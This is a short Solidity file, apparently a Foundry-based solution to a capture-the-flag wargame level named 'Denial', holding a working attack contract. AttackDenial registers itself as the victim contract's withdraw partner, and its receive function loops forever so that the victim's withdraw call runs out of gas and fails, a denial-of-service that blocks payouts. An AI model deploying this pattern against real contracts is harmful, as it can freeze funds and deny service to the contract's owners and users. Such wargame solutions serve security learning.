pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDenial {    
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;    
    function contractBalance() external view returns (uint) ;
}

contract AttackDenial {
    address public victim;
    IDenial public d;        

    constructor(address _victim) { 
        victim = _victim;                   
        d = IDenial(victim);
        d.setWithdrawPartner(address(this));    
    }
    receive() external payable {        
        while(true){}
    }        
}
